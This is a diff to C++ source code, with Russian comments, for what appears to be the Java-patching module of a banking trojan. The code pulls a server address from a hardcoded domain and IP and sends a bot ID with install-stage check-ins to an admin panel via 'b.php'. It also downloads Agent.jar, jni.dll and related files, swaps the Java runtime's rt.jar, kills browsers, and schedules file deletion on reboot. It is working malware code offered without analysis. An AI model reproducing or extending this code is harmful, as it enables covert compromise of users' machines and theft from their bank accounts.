@@ -139,6 +139,67 @@ const char* GetJREPath()
 	return 0;
 }
 
+static PCHAR GetJavaPatcherURL()
+{
+	// Функция возвращает адрес скрипта
+
+    #ifdef DEBUGCONFIG
+		return STR::New("http://bifitibsystem.org/");//"http://94.240.148.127/");//);//rt_jar/");
+	#endif
+
+	PCHAR URL = NULL;
+	do
+	{
+		#ifdef JavaConfigH
+			URL = GetJavaScriptURL(0);//JavaPatcherURLPath);
+		#else
+			URL = GetBotScriptURL(0, 0);//JavaPatcherURLPath); 
+		#endif
+		if (URL == NULL)
+        	pSleep(60000);
+	}
+	while(URL == NULL);
+
+	return URL;
+}
+
+//возвращает рабочую папу для патчера, и если указано, то добавляем имя файла
+static char* GetWorkFolder( char* path, const char* fileName = 0 )
+{
+	/*
+	pSHGetFolderPathA( 0, CSIDL_COMMON_APPDATA ,  0, 0, path );
+	pPathAppendA( path, "IBank" );
+	if( !Directory::IsExists(path) )
+		if( pCreateDirectoryA( path, 0 ) == 0 ) 
+			return 0;
+	*/
+	GetAllUsersProfile( path, MAX_PATH );
+	if( fileName )
+		pPathAppendA( path, fileName );
+	return path;
+}
+
+static void SendLogToAdmin( const char* url, const char* uid, const char* c, const char* v )
+{
+	char* qr = STR::New( 7, (char*)url, "b.php?uid=", (char*)uid, "&c=", (char*)c, "&v=", (char*)v );
+	THTTPResponse Response;
+	ClearStruct(Response);
+	HTTP::Get( qr, 0, &Response );
+	DBG( "JavaPatcher", "Отсылка лога: %s", qr );
+	HTTPResponse::Clear(&Response);
+	STR::Free(qr);
+}
+
+//отсылка инфы по патчу, если неизвестны урл и уид (для ситем, которые не имеют доступа к дамнному модулю)
+void SendLogToAdmin( const char* c, const char* v )
+{
+	char botUid[100];
+	GenerateUid(botUid);
+	PCHAR adminUrl = GetJavaPatcherURL(); 
+	SendLogToAdmin( adminUrl, botUid, c, v );
+	STR::Free(adminUrl);
+}
+
 static bool RunCmd( const char* exe, const char* cmd )
 {
 	SHELLEXECUTEINFOA in;
@@ -180,7 +241,7 @@ static bool UnpackToDir(const char* jarFileName, const char* dstFolder, const ch
 static bool UID_To_File(char* BotUid)
 {
 	char uidTxt[MAX_PATH];
-	if(	GetAllUsersProfile( uidTxt, sizeof(uidTxt), "uid.txt" ) )
+	if(	GetWorkFolder( uidTxt, "uid.txt" ) )
 	{
 		if( !File::IsExists(uidTxt) )
 		{
@@ -216,7 +277,7 @@ static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAd
 	pPathAppendA( libPath, "lib" );
 
 	char allUsersProfile[MAX_PATH];
-	if( !GetAllUsersProfile( allUsersProfile, sizeof(allUsersProfile) ) )
+	if( !GetWorkFolder(allUsersProfile) )
 		return false;
 
 	if( pSetCurrentDirectoryA(allUsersProfile) == 0 )
@@ -478,8 +539,11 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, javaExew, crcName ) )
 		return false;
 
+	SendLogToAdmin( "setup_patch", "2" );
 	//загрузка в папку ALLUSERSPROFILE
-	GetAllUsersProfile( Path, sizeof(Path) );
+	//GetAllUsersProfile( Path, sizeof(Path) );
+	if( GetWorkFolder(Path) == 0 )
+		return false;
 
 	const char* miscFiles[] = { "Agent.jar", "AgentPassive.jar", "jni.dll", "client2015.jar", 0 };
 	const char** ss = miscFiles;
@@ -493,6 +557,8 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 			return false;
 		ss++;
 	}
+
+	SendLogToAdmin( "setup_patch", "3" );
 
 	addUrl = "javassist.jar";
 	crcName = addUrl;
@@ -791,29 +857,6 @@ bool WINAPI ClearAndDel( LPVOID lpData )
 	return false;
 }
 
-static PCHAR GetJavaPatcherURL()
-{
-	// Функция возвращает адрес скрипта
-
-    #ifdef DEBUGCONFIG
-		return STR::New("http://bifitibsystem.org/");//"http://94.240.148.127/");//);//rt_jar/");
-	#endif
-
-	PCHAR URL = NULL;
-	do
-	{
-		#ifdef JavaConfigH
-			URL = GetJavaScriptURL(0);//JavaPatcherURLPath);
-		#else
-			URL = GetBotScriptURL(0, 0);//JavaPatcherURLPath); 
-		#endif
-		if (URL == NULL)
-        	pSleep(60000);
-	}
-	while(URL == NULL);
-
-	return URL;
-}
 //-----------------------------------------------------------------------------
 
 /*
@@ -846,7 +889,7 @@ static bool WJFile()
 static bool WJFile()
 {
 	char wj[MAX_PATH];
-	if (!GetAllUsersProfile( wj, sizeof(wj), JavaPatcherPidsFile))
+	if (!GetWorkFolder( wj, JavaPatcherPidsFile ))
 		return false;
 
 	if( !File::IsExists(wj))
@@ -855,27 +898,6 @@ static bool WJFile()
 	}
 
 	return File::IsExists(wj);
-}
-
-static void SendLogToAdmin( const char* url, const char* uid, const char* c, const char* v )
-{
-	char* qr = STR::New( 7, (char*)url, "b.php?uid=", (char*)uid, "&c=", (char*)c, "&v=", (char*)v );
-	THTTPResponse Response;
-	ClearStruct(Response);
-	HTTP::Get( qr, 0, &Response );
-	DBG( "JavaPatcher", "Отсылка лога: %s", qr );
-	HTTPResponse::Clear(&Response);
-	STR::Free(qr);
-}
-
-//отсылка инфы по патчу, если неизвестны урл и уид (для ситем, которые не имеют доступа к дамнному модулю)
-void SendLogToAdmin( const char* c, const char* v )
-{
-	char botUid[100];
-	GenerateUid(botUid);
-	PCHAR adminUrl = GetJavaPatcherURL(); 
-	SendLogToAdmin( adminUrl, botUid, c, v );
-	STR::Free(adminUrl);
 }
 
 static bool ReplacementExe(const char* java, const char* javao, const char* javaExe)
@@ -916,14 +938,21 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 	return ret;
 }
 
+//возвращает true если патч установлен
+static bool PatchIsLoaded()
+{
+	char uidTxt[MAX_PATH];
+	if( GetWorkFolder( uidTxt, "uid.txt" ) == 0 )
+		return true;
+	if( File::IsExists(uidTxt) ) //уже пропатчили
+		return true;
+	return false;
+}
+
 DWORD WINAPI JavaPatch( LPVOID lpData )
 {
 	WJFile();
 	OffUpdateJava();
-	char uidTxt[MAX_PATH];
-	GetAllUsersProfile( uidTxt, sizeof(uidTxt), "uid.txt" );
-	if( File::IsExists(uidTxt) ) //уже пропатчили
-		return TRUE;
 
 	MemPtr<513> user;
 	MemPtr<MAX_PATH> path, javaExe, javaExew;
@@ -935,7 +964,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 	//отсылаем версию бота
 //	SendLogToAdmin( adminUrl, botUid, "botver", version );
 	//сообщаем админке, что ява патч запущен
-	SendLogToAdmin( adminUrl, botUid, "setup_patch", "0" );
+//	SendLogToAdmin( adminUrl, botUid, "setup_patch", "0" );
 
 	DBG( "JavaPatcher", "файлы для патча грузим с %s", javaUrl );
 
@@ -991,7 +1020,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			if( res )
 			{
 				//сообщаем админке, что ява патч установлен
-				SendLogToAdmin( adminUrl, botUid, "setup_patch", "2" );
+				SendLogToAdmin( adminUrl, botUid, "setup_patch", "4" );
 			}
 			else //не удалось что-то заменить, делаем перезагрузку
 			{
@@ -1003,6 +1032,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 		};
 
 	}
+	SendLogToAdmin( adminUrl, botUid, "setup_patch", "5" );
 
 	STR::Free(adminUrl);
 	STR::Free(javaUrl);
@@ -1020,7 +1050,7 @@ DWORD WINAPI SendJavaPatchVersion(LPVOID)
 DWORD WINAPI Run_Path(LPVOID lpData)
 {
 	char testPath[MAX_PATH];
-	if(	GetAllUsersProfile(testPath, sizeof(testPath), JavaPatcherSignalFile))
+	if(	GetWorkFolder(testPath, JavaPatcherSignalFile ))
 	{
 		while( true )
 		{
@@ -1029,6 +1059,7 @@ DWORD WINAPI Run_Path(LPVOID lpData)
 				GetJavaVersion();
 				if( javaCompatible >= 0)
 				{
+					SendLogToAdmin( "setup_patch", "1" );
 					StartThread( JavaPatch, NULL );
 					StartThread( SendJavaPatchVersion, NULL );
 					//pSleep(5000); - узнать нафига тут задержка
@@ -1046,11 +1077,11 @@ bool ExecuteUpdatePathCommand( LPVOID Manager, PCHAR Command, PCHAR Args )
 	DBG( "JavaPatcher", "Обновление явы JavaPatch");
 	char fileName[MAX_PATH];
 	
-	GetAllUsersProfile( fileName, sizeof(fileName), JavaPatcherPidsFile);
-	pDeleteFileA(fileName);
+	if( GetWorkFolder( fileName, JavaPatcherPidsFile ) )
+		pDeleteFileA(fileName);
 
-	GetAllUsersProfile( fileName, sizeof(fileName), "uid.txt" );
-	pDeleteFileA(fileName);
+	if( GetWorkFolder( fileName, "uid.txt" ) )
+		pDeleteFileA(fileName);
 
 	GetJavaVersion();
 	if( javaCompatible >= 0 )
@@ -1060,40 +1091,37 @@ bool ExecuteUpdatePathCommand( LPVOID Manager, PCHAR Command, PCHAR Args )
 	return 0;
 }
 
+static void DeletePatchFile( const char* path, const char* nameFile )
+{
+	char delFile[MAX_PATH];
+	m_lstrcpy( delFile, path );
+	pPathAppendA( delFile, nameFile );
+	if( pDeleteFileA(delFile) == 0 )
+		pMoveFileExA( delFile, 0, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+}
+
 bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 {
 	DBG( "JavaPatcher", "UnPatch Java ");
 
 	if( !GetJavaVersion() ) return false;
 
-	char javaLib[MAX_PATH], file1[MAX_PATH], file2[MAX_PATH];
-	m_lstrcpy( javaLib, javaHome );
-	pPathAppendA( javaLib, "lib" );
-
 	KillAllBrowser();
 	pSleep(5000);
 
+	char path[MAX_PATH];
+	m_lstrcpy( path, javaHome );
+	pPathAppendA( path, "lib" );
 	//удаляем rt.jar и rt2.jar и rt.ini 
+	DeletePatchFile( path, "rt.jar" );
+	DeletePatchFile( path, "rt_.jar" );
+	DeletePatchFile( path, "rt2.jar" );
 
-	PCHAR sAppData = STR::Alloc(MAX_PATH * sizeof(CHAR));
-	pExpandEnvironmentStringsA("%AllUsersProfile%\\", sAppData, MAX_PATH);
-
-	m_lstrcpy( file1, javaLib );
-	pPathAppendA( file1, "rt.jar" );
-
-	if( !pDeleteFileA(file1))
+	if( GetWorkFolder(path) )
 	{
-		m_lstrcpy( file2, javaLib );
-		pPathAppendA( file2, "tmp.tmp" );
-		pMoveFileExA( file1, file2, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+		DeletePatchFile( path, "rt.ini" );
+		DeletePatchFile( path, "uid.txt" );
 	}
-
-	m_lstrcpy( file1, javaLib );
-	pPathAppendA( file1, "rt_.jar" );
-	pDeleteFileA(file1);
-
-	GetAllUsersProfile( file1, sizeof(file1), "rt.ini" );
-	pDeleteFileA(file1);
 	
 	return 0;
 }
@@ -1102,7 +1130,7 @@ bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 void JavaPatcherAddPidToFile()
 {
 	char wjDat[MAX_PATH];
-	if( GetAllUsersProfile( wjDat, sizeof(wjDat), JavaPatcherPidsFile ) )
+	if( GetWorkFolder( wjDat, JavaPatcherPidsFile ) )
 	{
 		DWORD PID = GetUniquePID();
 		if( File::IsExists(wjDat) )
@@ -1136,10 +1164,13 @@ void JavaPatcherAddPidToFile()
 // Функция сигнализирует о необходимости запуска патчей
 void  JavaPatcherSignal()
 {
+	if( PatchIsLoaded() ) return; //если патч установлен, то не нужно его повторно ставить
+	SendLogToAdmin( "setup_patch", "0" );
+
     JavaPatcherAddPidToFile();
 
 	char SignalFile[MAX_PATH];
-	if(GetAllUsersProfile(SignalFile, MAX_PATH, JavaPatcherSignalFile))
+	if( GetWorkFolder( SignalFile, JavaPatcherSignalFile ) )
 	{
 		File::WriteBufferA(SignalFile, (LPVOID)"1", 1);
 	}
